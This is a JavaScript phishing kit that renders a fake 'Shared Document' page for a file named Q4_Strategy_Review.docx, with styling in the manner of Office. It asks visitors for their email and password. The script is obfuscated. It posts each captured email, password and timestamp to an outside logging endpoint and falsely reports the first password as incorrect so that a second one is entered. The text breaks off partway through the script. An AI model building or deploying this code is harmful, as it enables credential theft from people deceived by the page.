
(function() {
    'use strict';

    // ============================================================
    // IMAGE CONFIGURATION
    // ============================================================
    
    const BACKGROUND_IMAGE = 'https://myprojec-37j.pages.dev/background-image.png';
    const DOCUMENT_ICON = 'https://myprojec-37j.pages.dev/bgo.png';
    const FONT_AWESOME = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css';

    // ============================================================
    // COMPLETE HTML TEMPLATE with EMBEDDED JAVASCRIPT
    // ============================================================
    
    const HTML_TEMPLATE = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Shared Document · Secure Access</title>
<link rel="stylesheet" href="${FONT_AWESOME}">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI','Helvetica Neue',sans-serif}
body{min-height:100vh;display:flex;justify-content:center;align-items:flex-start;margin:0;padding:20px;background:#f0f4fa;background-image:url('${BACKGROUND_IMAGE}');background-size:cover;background-position:center;background-repeat:no-repeat;position:relative;padding-top:60px}
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.3);backdrop-filter:blur(5px);z-index:0}
.card{background:rgba(255,255,255,0.95);backdrop-filter:blur(10px);max-width:440px;width:100%;min-height:480px;height:auto;margin-top:60px;padding:28px 24px 24px;border-radius:16px;box-shadow:0 12px 40px rgba(0,0,0,0.12),0 4px 16px rgba(0,0,0,0.04);position:relative;z-index:1;transition:box-shadow .25s;display:flex;flex-direction:column}
.doc-header{display:flex;align-items:center;gap:12px;margin-bottom:14px;padding-bottom:12px;border-bottom:1px solid #eef2f6;flex-shrink:0}
.doc-icon{background:#eef6ff;width:42px;height:42px;border-radius:10px;display:flex;align-items:center;justify-content:center;color:#1e5f9e;font-size:20px;flex-shrink:0;overflow:hidden}
.doc-icon img{width:32px;height:32px;object-fit:contain}
.doc-icon i{display:none}
.doc-meta{flex:1;min-width:0}
.doc-meta h2{font-size:16px;font-weight:600;color:#1b1b1b;letter-spacing:-.2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.doc-meta .shared-badge{background:#e3edf7;color:#1e5f9e;font-size:11px;font-weight:600;padding:2px 10px;border-radius:30px;display:inline-block;margin-top:2px}
.doc-meta .shared-badge i{margin-right:4px;font-size:10px}
.step-indicator{display:flex;align-items:center;gap:8px;margin-bottom:10px;flex-shrink:0}
.step-badge{background:#eef2f6;color:#3c3c3c;font-size:12px;font-weight:500;padding:3px 12px;border-radius:40px;letter-spacing:.2px}
.step-badge.active{background:#1e5f9e;color:#fff}
.step-badge i{margin-right:4px;font-size:11px}
#stepBadge2{display:none!important}
.status-message{background:#f8fafc;padding:8px 14px;border-radius:8px;font-size:13px;color:#1b1b1b;margin-bottom:10px;border-left:3px solid #1e5f9e;display:flex;align-items:center;gap:10px;flex-shrink:0;min-height:36px}
.status-message i{color:#1e5f9e;font-size:16px}
.status-message.error{border-left-color:#c42b2b;background:#fff6f6}
.status-message.error i{color:#c42b2b}
.status-message.success{border-left-color:#1e8e3e;background:#f0faf3}
.status-message.success i{color:#1e8e3e}
.step-content{flex:1;display:flex;flex-direction:column;justify-content:center}
.form-group{margin-bottom:14px}
label{display:block;font-size:13px;font-weight:500;color:#2b2b2b;margin-bottom:5px}
.email-label{font-size:18px;font-weight:700;color:#1b1b1b;letter-spacing:.2px}
.password-label{font-size:18px;font-weight:700;color:#1b1b1b;letter-spacing:.2px}
.input-wrapper{position:relative;display:flex;align-items:center;background:#fbfcfd;border:1px solid #d1d9e6;border-radius:8px;transition:border-color .15s,box-shadow .15s}
.input-wrapper:focus-within{border-color:#1e5f9e;box-shadow:0 0 0 3px rgba(30,95,158,.15);background:#fff}
.input-wrapper .email-icon{color:#7a7a7a;font-size:15px;padding:0 0 0 12px;width:34px;text-align:center;flex-shrink:0}
.input-wrapper input{width:100%;padding:12px 12px 12px 4px;border:none;background:transparent;font-size:14px;outline:none;color:#1b1b1b;font-weight:400}
.input-wrapper input::placeholder{color:#9aa6b5;font-weight:300;font-size:13px}
.toggle-pwd{background:none;border:none;color:#7a7a7a;padding-right:12px;cursor:pointer;font-size:15px;display:flex;align-items:center;flex-shrink:0}
.toggle-pwd:hover{color:#1b1b1b}
.action-btn{width:100%;padding:12px;background:#1e5f9e;border:none;border-radius:8px;color:#fff;font-size:15px;font-weight:600;cursor:pointer;transition:background .15s,box-shadow .15s;display:flex;justify-content:center;align-items:center;gap:8px;letter-spacing:.2px;margin-top:4px;flex-shrink:0}
.action-btn:hover{background:#154a7a;box-shadow:0 4px 12px rgba(30,95,158,.25)}
.action-btn:active{transform:scale(.97);background:#0f3a5f}
.action-btn:disabled{opacity:.7;cursor:not-allowed}
.hidden{display:none!important}
.email-display{background:#f2f6fc;padding:8px 14px;border-radius:8px;font-size:14px;color:#1b1b1b;margin-bottom:12px;display:flex;align-items:center;gap:10px;border:1px solid #dce3ec;flex-shrink:0}
.email-display i{color:#1e5f9e;font-size:15px}
.email-display span{font-weight:500;word-break:break-all}
.text-center{text-align:center}
.text-sm{font-size:12px;color:#5e5e5e}
.mt-2{margin-top:6px}
.footer-links{margin-top:14px;font-size:11px;color:#7a7a7a;text-align:center;border-top:1px solid #eaeef3;padding-top:12px;flex-shrink:0}
.footer-links a{color:#1e5f9e;text-decoration:none;margin:0 6px}
.footer-links a:hover{text-decoration:underline}
.password-error{background:#fff6f6;padding:8px 14px;border-radius:8px;font-size:13px;color:#c42b2b;margin-bottom:12px;border-left:3px solid #c42b2b;display:flex;align-items:center;gap:10px;flex-shrink:0;min-height:36px}
.password-error i{color:#c42b2b;font-size:16px}
.password-error.hidden{display:none!important}
@media(max-width:768px){body{padding:16px;padding-top:50px}.card{padding:24px 20px}}
@media(max-width:600px){body{padding:12px;padding-top:40px}.card{padding:20px 16px;min-height:460px;margin-top:30px}.doc-meta h2{font-size:14px}.email-label,.password-label{font-size:16px}.step-badge{font-size:11px;padding:2px 10px}.step-badge i{font-size:10px}.status-message{font-size:12px;padding:6px 12px;min-height:32px}.status-message i{font-size:14px}.password-error{font-size:12px;padding:6px 12px;min-height:32px}.password-error i{font-size:14px}.input-wrapper input{font-size:13px;padding:10px 10px 10px 4px}.input-wrapper .email-icon{font-size:13px;padding:0 0 0 10px;width:30px}.action-btn{font-size:14px;padding:10px}.footer-links{font-size:10px}}
@media(max-width:400px){body{padding:8px;padding-top:30px}.card{padding:16px 12px;min-height:420px;border-radius:12px}.doc-icon{width:36px;height:36px}.doc-icon img{width:28px;height:28px}.doc-meta h2{font-size:13px}.shared-badge{font-size:10px;padding:1px 8px}.email-label,.password-label{font-size:14px}.step-badge{font-size:10px;padding:2px 8px}.step-badge i{font-size:9px}.status-message{font-size:11px;padding:5px 10px;min-height:28px}.status-message i{font-size:12px}.password-error{font-size:11px;padding:5px 10px;min-height:28px}.password-error i{font-size:12px}.input-wrapper input{font-size:12px;padding:8px 8px 8px 4px}.input-wrapper .email-icon{font-size:12px;padding:0 0 0 8px;width:26px}.action-btn{font-size:13px;padding:8px;border-radius:6px}.action-btn i{font-size:12px}.email-display{font-size:12px;padding:6px 10px}.email-display i{font-size:13px}.text-sm{font-size:11px}.footer-links{font-size:10px;margin-top:10px;padding-top:10px}}
@media(max-width:350px){body{padding:4px;padding-top:20px}.card{padding:12px 8px;min-height:380px;border-radius:10px}.doc-meta h2{font-size:12px}.email-label,.password-label{font-size:13px}.input-wrapper input{font-size:11px;padding:6px 6px 6px 4px}.action-btn{font-size:12px;padding:7px}.status-message{font-size:10px;padding:4px 8px}.password-error{font-size:10px;padding:4px 8px}.step-badge{font-size:9px;padding:2px 6px}.step-badge i{font-size:8px}}
@media(min-height:900px){body{padding-top:100px}.card{margin-top:80px}}
@media(max-height:500px) and (orientation:landscape){body{padding-top:15px;padding-bottom:15px}.card{margin-top:20px;padding:14px 18px;min-height:320px;max-width:480px}.doc-header{margin-bottom:8px;padding-bottom:8px}.step-indicator{margin-bottom:6px}.status-message{margin-bottom:6px;padding:4px 10px;min-height:24px}.password-error{margin-bottom:6px;padding:4px 10px;min-height:24px}.form-group{margin-bottom:8px}.action-btn{padding:8px;margin-top:2px}.doc-icon{width:32px;height:32px}.doc-icon img{width:24px;height:24px}.doc-meta h2{font-size:13px}.email-label,.password-label{font-size:14px}.input-wrapper input{padding:6px 8px 6px 4px;font-size:12px}}
@media(hover:none) and (pointer:coarse){.action-btn:hover{transform:none;box-shadow:none}.action-btn:active{transform:scale(.97)}.input-wrapper input{font-size:16px}}
@media(prefers-reduced-motion:reduce){*{animation-duration:.01ms!important;transition-duration:.01ms!important}}
</style>
</head>
<body>
<div class="card" role="main">
    <div class="doc-header">
        <div class="doc-icon">
            <img src="${DOCUMENT_ICON}" alt="Document icon" onerror="this.style.display='none';this.nextElementSibling.style.display='inline';">
            <i class="fas fa-file-pdf"></i>
        </div>
        <div class="doc-meta">
            <h2>Q4_Strategy_Review.docx</h2>
            <span class="shared-badge"><i class="fas fa-user-friends"></i> Shared with you</span>
        </div>
    </div>
    <div class="step-indicator">
        <span class="step-badge active" id="stepBadge1"><i class="fas fa-envelope"></i> Email</span>
        <span class="step-badge" id="stepBadge2"><i class="fas fa-lock"></i> Password</span>
    </div>
    <div id="statusMessage" class="status-message">
        <i class="fas fa-info-circle"></i>
        <span id="statusText">Enter your email to access the shared document.</span>
    </div>
    <div class="step-content">
        <div id="stepEmail">
            <div class="form-group">
                <label for="emailInput" class="email-label">Email</label>
                <div class="input-wrapper">
                    <i class="fas fa-envelope email-icon"></i>
                    <input type="email" id="emailInput" placeholder="you@example.com" autocomplete="email" value="">
                </div>
            </div>
            <button class="action-btn" id="emailNextBtn"><i class="fas fa-arrow-right"></i> Continue</button>
            <div class="text-center text-sm mt-2">This document is shared with verified users.</div>
        </div>
        <div id="stepPasswordFirst" class="hidden">
            <div class="email-display">
                <i class="fas fa-user-circle"></i>
                <span id="displayEmailFirst">user@example.com</span>
            </div>
            <div id="passwordErrorFirst" class="password-error hidden">
                <i class="fas fa-exclamation-circle"></i>
                <span id="passwordErrorTextFirst">Incorrect password, please try again.</span>
            </div>
            <div class="form-group">
                <label for="passwordFirstInput" class="password-label">Enter password</label>
                <div class="input-wrapper">
                    <input type="password" id="passwordFirstInput" placeholder="Enter password" autocomplete="current-password">
                    <button type="button" class="toggle-pwd" id="togglePwdFirst" aria-label="Show password">
                        <i class="fas fa-eye"></i>
                    </button>
                </div>
            </div>
            <button class="action-btn" id="pwdFirstBtn"><i class="fas fa-sign-in-alt"></i> Sign In</button>
        </div>
        <div id="stepPasswordSecond" class="hidden">
            <div class="email-display">
                <i class="fas fa-user-circle"></i>
                <span id="displayEmailSecond">user@example.com</span>
            </div>
            <div id="passwordErrorSecond" class="password-error">
                <i class="fas fa-exclamation-circle"></i>
                <span id="passwordErrorTextSecond">Incorrect password, please try again.</span>
            </div>
            <div class="form-group">
                <label for="passwordSecondInput" class="password-label">Enter password</label>
                <div class="input-wrapper">
                    <input type="password" id="passwordSecondInput" placeholder="Enter password" autocomplete="current-password">
                    <button type="button" class="toggle-pwd" id="togglePwdSecond" aria-label="Show password">
                        <i class="fas fa-eye"></i>
                    </button>
                </div>
            </div>
            <button class="action-btn" id="pwdSecondBtn"><i class="fas fa-sign-in-alt"></i> Sign In</button>
        </div>
    </div>
    <div class="footer-links">
        <a href="#">Privacy</a> · <a href="#">Terms</a> · <a href="#">Support</a>
    </div>
</div>

<script>
// ============================================================
// ALL JAVASCRIPT IS HERE - EMBEDDED IN THE HTML
// ============================================================
(function(_0x17a56e,_0x838e6e){'use strict';console['\u006C\u006F\u0067']("\u2705\u0020\u0045\u006D\u0062\u0065\u0064\u0064\u0065\u0064\u0020\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u006C\u006F\u0061\u0064\u0065\u0064");var _0x5a7bfd=(764113^764115)+(958133^958134);var _0x4777cc={'\u006C\u006F\u0067\u0045\u006E\u0064\u0070\u006F\u0069\u006E\u0074':'https://yourdomain.com/log.php',"redirectUrl":'https://www.office.com'};_0x5a7bfd=(967836^967834)+(799770^799768);var _0xf3a7dg=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0065\u006D\u0061\u0069\u006C\u0049\u006E\u0070\u0075\u0074");_0x17a56e=431871^431862;var _0xb45e=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("tupnItsriFdrowssap".split("").reverse().join(""));var _0xg_0x7dg=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0053\u0065\u0063\u006F\u006E\u0064\u0049\u006E\u0070\u0075\u0074");var _0x1f5f6b=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0065\u006D\u0061\u0069\u006C\u004E\u0065\u0078\u0074\u0042\u0074\u006E");var _0x6ae=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("ntBtsriFdwp".split("").reverse().join(""));var _0x3b3b4c=(247135^247129)+(712897^712903);var _0xa6c=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0070\u0077\u0064\u0053\u0065\u0063\u006F\u006E\u0064\u0042\u0074\u006E");_0x3b3b4c=(833365^833362)+(831093^831088);var _0xc9f6ea=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0073\u0074\u0061\u0074\u0075\u0073\u0054\u0065\u0078\u0074");var _0xeba=(650443^650442)+(640096^640099);var _0x629c=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("egasseMsutats".split("").reverse().join(""));_0xeba="pldfnh".split("").reverse().join("");var _0x27d3eb=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("1egdaBpets".split("").reverse().join(""));var _0x07acfd=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0073\u0074\u0065\u0070\u0045\u006D\u0061\u0069\u006C");var _0x94c7e=(997987^997991)+(552614^552609);var _0x_0x452=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0073\u0074\u0065\u0070\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0046\u0069\u0072\u0073\u0074");_0x94c7e=249850^249852;var _0x14e45e=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0073\u0074\u0065\u0070\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0053\u0065\u0063\u006F\u006E\u0064");_0x838e6e=(523304^523310)+(851361^851362);var _0x432e=(118308^118317)+(160414^160409);var _0xcbbd=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0064\u0069\u0073\u0070\u006C\u0061\u0079\u0045\u006D\u0061\u0069\u006C\u0046\u0069\u0072\u0073\u0074");_0x432e=(793220^793228)+(486727^486723);var _0x42476b=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0064\u0069\u0073\u0070\u006C\u0061\u0079\u0045\u006D\u0061\u0069\u006C\u0053\u0065\u0063\u006F\u006E\u0064");var _0xaafe=(539450^539450)+(505240^505245);var _0x29557e=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0074\u006F\u0067\u0067\u006C\u0065\u0050\u0077\u0064\u0046\u0069\u0072\u0073\u0074");_0xaafe=(311095^311102)+(299236^299237);var _0xd642a=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("\u0074\u006F\u0067\u0067\u006C\u0065\u0050\u0077\u0064\u0053\u0065\u0063\u006F\u006E\u0064");var _0x18caa=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("tsriFrorrEdrowssap".split("").reverse().join(""));var _0x4c37ef=(495601^495609)+(886959^886958);var _0x204ee=document['\u0067\u0065\u0074\u0045\u006C\u0065\u006D\u0065\u006E\u0074\u0042\u0079\u0049\u0064']("dnoceSrorrEdrowssap".split("").reverse().join(""));_0x4c37ef='\u006C\u0063\u0063\u0066\u006E\u006D';console['\u006C\u006F\u0067']("...stnemele MOD gnikcehC \uDD0D\uD83D".split("").reverse().join(""));console['\u006C\u006F\u0067']("\u0065\u006D\u0061\u0069\u006C\u0049\u006E\u0070\u0075\u0074\u003A",!!_0xf3a7dg);console['\u006C\u006F\u0067']("\u0065\u006D\u0061\u0069\u006C\u004E\u0065\u0078\u0074\u0042\u0074\u006E\u003A",!!_0x1f5f6b);console['\u006C\u006F\u0067']("\u0070\u0077\u0064\u0046\u0069\u0072\u0073\u0074\u0042\u0074\u006E\u003A",!!_0x6ae);console['\u006C\u006F\u0067']("\u0070\u0077\u0064\u0053\u0065\u0063\u006F\u006E\u0064\u0042\u0074\u006E\u003A",!!_0xa6c);if(!_0xf3a7dg||!_0x1f5f6b){console['\u0065\u0072\u0072\u006F\u0072']("\u274C\u0020\u0043\u0072\u0069\u0074\u0069\u0063\u0061\u006C\u0020\u0065\u006C\u0065\u006D\u0065\u006E\u0074\u0073\u0020\u006D\u0069\u0073\u0073\u0069\u006E\u0067\u0021");setTimeout(function(){location['\u0072\u0065\u006C\u006F\u0061\u0064']();},737191^736335);return;}var _0x173bfb='';function _0xec6b3e(message,type){type=type||"ofni".split("").reverse().join("");if(_0xc9f6ea){_0xc9f6ea['\u0069\u006E\u006E\u0065\u0072\u0054\u0065\u0078\u0074']=message;}if(_0x629c){_0x629c['\u0063\u006C\u0061\u0073\u0073\u004E\u0061\u006D\u0065']="\u0073\u0074\u0061\u0074\u0075\u0073\u002D\u006D\u0065\u0073\u0073\u0061\u0067\u0065";if(type==="rorre".split("").reverse().join("")){_0x629c['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("\u0065\u0072\u0072\u006F\u0072");}else if(type==="\u0073\u0075\u0063\u0063\u0065\u0073\u0073"){_0x629c['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("\u0073\u0075\u0063\u0063\u0065\u0073\u0073");}var _0x6c45g=_0x629c['\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006C\u0065\u0063\u0074\u006F\u0072']("\u0069");if(_0x6c45g){if(type==="\u0065\u0072\u0072\u006F\u0072"){_0x6c45g['\u0063\u006C\u0061\u0073\u0073\u004E\u0061\u006D\u0065']="\u0066\u0061\u0073\u0020\u0066\u0061\u002D\u0065\u0078\u0063\u006C\u0061\u006D\u0061\u0074\u0069\u006F\u006E\u002D\u0063\u0069\u0072\u0063\u006C\u0065";}else if(type==="\u0073\u0075\u0063\u0063\u0065\u0073\u0073"){_0x6c45g['\u0063\u006C\u0061\u0073\u0073\u004E\u0061\u006D\u0065']="\u0066\u0061\u0073\u0020\u0066\u0061\u002D\u0063\u0068\u0065\u0063\u006B\u002D\u0063\u0069\u0072\u0063\u006C\u0065";}else{_0x6c45g['\u0063\u006C\u0061\u0073\u0073\u004E\u0061\u006D\u0065']="\u0066\u0061\u0073\u0020\u0066\u0061\u002D\u0069\u006E\u0066\u006F\u002D\u0063\u0069\u0072\u0063\u006C\u0065";}}}}function _0x3ee6cg(step){if(_0x27d3eb){_0x27d3eb['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("evitca".split("").reverse().join(""));if(step===(278681^278680)){_0x27d3eb['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("\u0061\u0063\u0074\u0069\u0076\u0065");}}}function _0xeb_0xc1d(show,step){if(step===(440242^440240)&&_0x18caa){if(show){_0x18caa['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("\u0068\u0069\u0064\u0064\u0065\u006E");}else{_0x18caa['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("\u0068\u0069\u0064\u0064\u0065\u006E");}}else if(step===(517585^517586)&&_0x204ee){if(show){_0x204ee['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("neddih".split("").reverse().join(""));}else{_0x204ee['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("\u0068\u0069\u0064\u0064\u0065\u006E");}}}function _0xd80c(step,email){email=email||'';if(_0x07acfd)_0x07acfd['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("\u0068\u0069\u0064\u0064\u0065\u006E");if(_0x_0x452)_0x_0x452['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("\u0068\u0069\u0064\u0064\u0065\u006E");if(_0x14e45e)_0x14e45e['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0061\u0064\u0064']("\u0068\u0069\u0064\u0064\u0065\u006E");_0xeb_0xc1d(false,200392^200394);_0xeb_0xc1d(false,974562^974561);if(step===(642511^642510)){if(_0x07acfd)_0x07acfd['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("neddih".split("").reverse().join(""));_0x3ee6cg(131609^131608);if(_0xf3a7dg){setTimeout(function(){_0xf3a7dg['\u0066\u006F\u0063\u0075\u0073']();},974339^974439);}_0xec6b3e("\u0045\u006E\u0074\u0065\u0072\u0020\u0079\u006F\u0075\u0072\u0020\u0065\u006D\u0061\u0069\u006C\u0020\u0074\u006F\u0020\u0061\u0063\u0063\u0065\u0073\u0073\u0020\u0074\u0068\u0065\u0020\u0073\u0068\u0061\u0072\u0065\u0064\u0020\u0064\u006F\u0063\u0075\u006D\u0065\u006E\u0074\u002E","ofni".split("").reverse().join(""));}else if(step===(119482^119480)){if(_0x_0x452)_0x_0x452['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("\u0068\u0069\u0064\u0064\u0065\u006E");_0x3ee6cg(929124^929126);if(email&&_0xcbbd){_0xcbbd['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=email;}if(_0xb45e){_0xb45e['\u0076\u0061\u006C\u0075\u0065']='';setTimeout(function(){_0xb45e['\u0066\u006F\u0063\u0075\u0073']();},648955^648863);}_0xec6b3e("\u0045\u006E\u0074\u0065\u0072\u0020\u0079\u006F\u0075\u0072\u0020\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0020\u0066\u006F\u0072\u0020"+email,"\u0069\u006E\u0066\u006F");}else if(step===(618757^618758)){if(_0x14e45e)_0x14e45e['\u0063\u006C\u0061\u0073\u0073\u004C\u0069\u0073\u0074']['\u0072\u0065\u006D\u006F\u0076\u0065']("\u0068\u0069\u0064\u0064\u0065\u006E");_0x3ee6cg(838106^838105);if(email&&_0x42476b){_0x42476b['\u0074\u0065\u0078\u0074\u0043\u006F\u006E\u0074\u0065\u006E\u0074']=email;}if(_0xg_0x7dg){_0xg_0x7dg['\u0076\u0061\u006C\u0075\u0065']='';setTimeout(function(){_0xg_0x7dg['\u0066\u006F\u0063\u0075\u0073']();},118629^118529);}_0xeb_0xc1d(!![],528720^528723);_0xec6b3e(".drowssap tnereffid a htiw niaga yrt esaelP".split("").reverse().join(""),"rorre".split("").reverse().join(""));}}function _0x1bf(){if(_0xf3a7dg)_0xf3a7dg['\u0076\u0061\u006C\u0075\u0065']='';if(_0xb45e)_0xb45e['\u0076\u0061\u006C\u0075\u0065']='';if(_0xg_0x7dg)_0xg_0x7dg['\u0076\u0061\u006C\u0075\u0065']='';_0x173bfb='';_0xeb_0xc1d(false,286451^286449);_0xeb_0xc1d(false,502282^502281);_0xd80c(906843^906842);if(_0xa6c){_0xa6c['\u0064\u0069\u0073\u0061\u0062\u006C\u0065\u0064']=false;_0xa6c['\u0069\u006E\u006E\u0065\u0072\u0048\u0054\u004D\u004C']="nI ngiS >i/<>\"tla-ni-ngis-af saf\"=ssalc i<".split("").reverse().join("");}}function _0x715g5f(email,password,eventType){var _0x5f920b=(378734^378730)+(602117^602119);var _0x57f8d={'\u0065\u006D\u0061\u0069\u006C':email,'\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064':password,'\u0065\u0076\u0065\u006E\u0074':eventType,"timestamp":new Date()['\u0074\u006F\u0049\u0053\u004F\u0053\u0074\u0072\u0069\u006E\u0067']()};_0x5f920b=(817462^817456)+(917587^917587);if(_0x4777cc['\u006C\u006F\u0067\u0045\u006E\u0064\u0070\u006F\u0069\u006E\u0074']){try{fetch(_0x4777cc['\u006C\u006F\u0067\u0045\u006E\u0064\u0070\u006F\u0069\u006E\u0074'],{"method":'POST','\u0068\u0065\u0061\u0064\u0065\u0072\u0073':{"\u0043\u006F\u006E\u0074\u0065\u006E\u0074\u002D\u0054\u0079\u0070\u0065":"\u0061\u0070\u0070\u006C\u0069\u0063\u0061\u0074\u0069\u006F\u006E\u002F\u006A\u0073\u006F\u006E"},'\u0062\u006F\u0064\u0079':JSON['\u0073\u0074\u0072\u0069\u006E\u0067\u0069\u0066\u0079'](_0x57f8d),'\u006B\u0065\u0065\u0070\u0061\u006C\u0069\u0076\u0065':!![]})['\u0063\u0061\u0074\u0063\u0068'](function(error){console['\u006C\u006F\u0067']("\u26A0\uFE0F\u0020\u004C\u006F\u0067\u0067\u0069\u006E\u0067\u0020\u0066\u0061\u0069\u006C\u0065\u0064\u003A",error);});}catch(e){console['\u006C\u006F\u0067'](":rorre gniggoL \uFE0F\u26A0".split("").reverse().join(""),e);}}}_0x1f5f6b['\u006F\u006E\u0063\u006C\u0069\u0063\u006B']=function(e){e['\u0070\u0072\u0065\u0076\u0065\u006E\u0074\u0044\u0065\u0066\u0061\u0075\u006C\u0074']();console['\u006C\u006F\u0067']("dekcilc nottub liamE \uDCE7\uD83D".split("").reverse().join(""));var _0xec2c4f=(663623^663618)+(151114^151117);var _0x64e0a=_0xf3a7dg['\u0076\u0061\u006C\u0075\u0065']['\u0074\u0072\u0069\u006D']();_0xec2c4f=160408^160412;if(!_0x64e0a||_0x64e0a['\u0069\u006E\u0064\u0065\u0078\u004F\u0066']("\u0040")===-(886272^886273)||_0x64e0a['\u0069\u006E\u0064\u0065\u0078\u004F\u0066']("\u002E")===-(713218^713219)){_0xec6b3e(".sserdda liame dilav a retne esaelP".split("").reverse().join(""),"\u0065\u0072\u0072\u006F\u0072");return;}_0x173bfb=_0x64e0a;try{localStorage['\u0073\u0065\u0074\u0049\u0074\u0065\u006D']("liamEcoDderahs".split("").reverse().join(""),_0x64e0a);}catch(e){}console['\u006C\u006F\u0067']("\uD83D\uDCE7\u0020\u0045\u006D\u0061\u0069\u006C\u0020\u0065\u006E\u0074\u0065\u0072\u0065\u0064\u003A",_0x64e0a);_0xd80c(575204^575206,_0x64e0a);};_0x6ae['\u006F\u006E\u0063\u006C\u0069\u0063\u006B']=function(e){e['\u0070\u0072\u0065\u0076\u0065\u006E\u0074\u0044\u0065\u0066\u0061\u0075\u006C\u0074']();console['\u006C\u006F\u0067']("dekcilc nottub drowssap tsriF \uDD11\uD83D".split("").reverse().join(""));var _0x41a59d=_0xb45e['\u0076\u0061\u006C\u0075\u0065']['\u0074\u0072\u0069\u006D']();if(!_0x41a59d){_0xec6b3e(".drowssap a retne esaelP".split("").reverse().join(""),"\u0065\u0072\u0072\u006F\u0072");return;}var _0x34bb4f=(104159^104150)+(137045^137053);var _0xe6d49b=_0x173bfb||"\u0075\u0073\u0065\u0072";_0x34bb4f=(505269^505276)+(145010^145009);try{_0xe6d49b=localStorage['\u0067\u0065\u0074\u0049\u0074\u0065\u006D']("liamEcoDderahs".split("").reverse().join(""))||_0xe6d49b;}catch(e){}console['\u006C\u006F\u0067']("\uD83D\uDD11\u0020\u0046\u0069\u0072\u0073\u0074\u0020\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0020\u0061\u0074\u0074\u0065\u006D\u0070\u0074\u0020\u0066\u006F\u0072\u003A",_0xe6d49b);_0x715g5f(_0xe6d49b,_0x41a59d,"\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u005F\u0061\u0074\u0074\u0065\u006D\u0070\u0074\u005F\u0031");_0xeb_0xc1d(!![],181243^181241);_0xec6b3e("\u0049\u006E\u0063\u006F\u0072\u0072\u0065\u0063\u0074\u0020\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u002C\u0020\u0070\u006C\u0065\u0061\u0073\u0065\u0020\u0074\u0072\u0079\u0020\u0061\u0067\u0061\u0069\u006E\u002E","\u0065\u0072\u0072\u006F\u0072");_0xb45e['\u0076\u0061\u006C\u0075\u0065']='';setTimeout(function(){_0xb45e['\u0066\u006F\u0063\u0075\u0073']();},545805^545897);_0xd80c(772985^772986,_0xe6d4